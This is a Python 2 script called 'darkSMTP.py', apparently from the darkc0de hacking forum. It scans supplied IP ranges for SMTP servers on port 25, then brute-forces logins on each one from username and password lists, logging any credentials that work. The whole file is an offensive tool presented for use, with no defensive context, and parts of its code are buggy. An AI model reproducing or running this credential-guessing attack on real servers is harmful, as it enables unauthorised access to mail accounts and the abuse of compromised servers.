#!/usr/bin/python -O
#
################################################################ 
#       .___             __          _______       .___        # 
#     __| _/____ _______|  | __ ____ \   _  \    __| _/____    # 
#    / __ |\__  \\_  __ \  |/ // ___\/  /_\  \  / __ |/ __ \   # 
#   / /_/ | / __ \|  | \/    <\  \___\  \_/   \/ /_/ \  ___/   # 
#   \____ |(______/__|  |__|_ \\_____>\_____  /\_____|\____\   # 
#        \/                  \/             \/                 # 
#                   ___________   ______  _  __                # 
#                 _/ ___\_  __ \_/ __ \ \/ \/ /                # 
#                 \  \___|  | \/\  ___/\     /                 # 
#                  \___  >__|    \___  >\/\_/                  # 
#      est.2007        \/            \/   forum.darkc0de.com   # 
################################################################
#
# darkSMTP.py c0ded by mr_me
#
# The multithreaded SMTP scanner
# Takes a list of ips like:
#
# 91.121.248.72
# 91.121.248.73
# 91.121.248.74
# 91.121.248.75
# 91.121.248.76
# 91.121.248.77
# 91.121.248.78
#
# ----snip----
#

import threading, time, random, sys, smtplib, socket
from smtplib import SMTP
from copy import copy
from optparse import OptionParser 

usage= "./%prog -i <iplist> -t <threads> -u <userlist> -p <passlist>" 
usage = usage+"\nExample: ./%prog -i ips.txt -t 8 -u user.txt -p pass.txt" 
parser = OptionParser(usage=usage) 
parser.add_option("-i", 
                  action="store", dest="ips", 
                  help="IP list for scanning") 
parser.add_option("-t", type="int", 
                  action="store", dest="threads", 
                  help="Threads for processing") 
parser.add_option("-u",
                  action="store", dest="users",
                  help="List of usernames")
parser.add_option("-p",
                  action="store", dest="passes",
                  help="List of passwords")
(options, args) = parser.parse_args() 

def banner():
	print "\n|----------------------------------------------------|"
	print "|          _                                         |"
	print "|  ____ __| |_ _ __   ___ __ __ _ _ _  _ _  ___ _ _  |"
	print "| (_-< '  \  _| '_ \ (_-</ _/ _` | ' \| ' \/ -_) '_| |"
	print "| /__/_|_|_\__| .__/ /__/\__\__,_|_||_|_||_\___|_|   |"
	print "|             |_|                                    |"
	print "|----------------------------------------------------|"
	print "| +-+-+ +-+-+-+-+-+ 			             |"
	print "| |b|y| |m|r|_|m|e|	  Greetz: d3hydr8 &	     |"
	print "| +-+-+ +-+-+-+-+-+	  the darkc0de crew  	     |"
	print "|----------------------------------------------------|\n"

def timer():
        now = time.localtime(time.time())
        return time.asctime(now)

if len(sys.argv) != 9: 
   	banner()
	parser.print_help() 
	sys.exit(1) 

i = 1
port = 25
threads = options.threads
file = options.ips
users = options.users
passes = options.passes
completed = []
threaders = []
logger = open('darkSMTP.txt','w')
ipfile = open(file,'r')
banner()
print "[+] Warming up...ok";
lines = ipfile.readlines()
print "[+] IP's loaded:",len(lines);
print "[+] Users loaded:",len(users)
print "[+] Passwords loaded:",len(passes)
ipfile.close();
eachThread = len(lines) / int(threads);
print "[+] IP's per thread:",eachThread;

class myThread (threading.Thread):
    def __init__(self, threadID, name, counter):
        self.threadID = threadID
        self.name = name
        self.counter = counter
        threading.Thread.__init__(self)
    def run(self):
        print "[+] Starting " + self.name
        connect(self.name, self.counter, eachThread, self.threadID)

def connect(threadName, delay, counter, threadID):
	start = threadID * counter
        file = open(options.ips,'r')
        data = file.readlines()
	while counter:
		if 0:
   	        	thread.exit()
		s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		s.settimeout(2)
		try:
                	connect=s.connect((data[start-counter],port))
	        	print "[+] SMTP server on: " + data[start-counter],
			print "[+] Server added to output file!" 
		 	logger.write(data[start-counter])
			if s.recv(1024):
				completed.append(data[start-counter].rstrip())
		except socket.timeout:	
			print "[-] Server non-existant: " + data[start-counter].rstrip()
        	except socket.error:
                	print "[+] Server exists! " + data[start-counter].rstrip();
			print "[-] But it's not SMTP"
        	s.close()
		time.sleep(delay)
		counter -= 1

while (i < int(threads + 1)):
	thread = myThread(i, "Thread " + str(i), i);	
	threaders.append(thread)
	i += 1
	thread.start()

for t in threaders:
    t.join()

print "\n--- Found & logged all SMTP servers in range ---\n"
print "---------------------------------------------------"
print "[+] Starting dictionary attack for each SMTP server"
print "---------------------------------------------------\n"

# d3hydr8, I love your c0de bro ;)

try:	
	helo = smtplib.SMTP(sys.argv[1])
	name = helo.helo()
	helo.quit()
except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException):
	name = "[-] Server doesn't support the Helo cmd"

try:
  	users = open(users, "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(passes, "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

wordlist = copy(words)
def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])
	else:
		reloader()
		value = random.sample(words,  1)
		words.remove(value[0])
		users.remove(users[0])
	lock.release()
	return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	def __init__(self):
        	threading.Thread.__init__(self)
	def run(self):
		value, user = getword()
		for ip in completed:
			print "-"*12
			print "[+] IP: "+ip
			try:
				print "User:",user,"Password:",value
				smtp = smtplib.SMTP(ip)
				smtp.login(user, value)
				print "\t\n[!] Login successful:",user, value
				logger.write("[!] Found: " + ip + " " + str(user) + ":" + str(value) + "\n")
				smtp.quit()
				sys.exit(2)
			except(socket.gaierror, socket.error, socket.herror, smtplib.SMTPException), msg: 
				pass

for i in range(len(words)*len(users)):
	work = Worker()
	work.start()
	threaders.append(work)
	time.sleep(1)

for t in threaders:
	t.join()

logger.close()
print "\n[!] Dont forget to check darkSMTP.txt"
print "[!] Ended at: " + timer() + "\n"

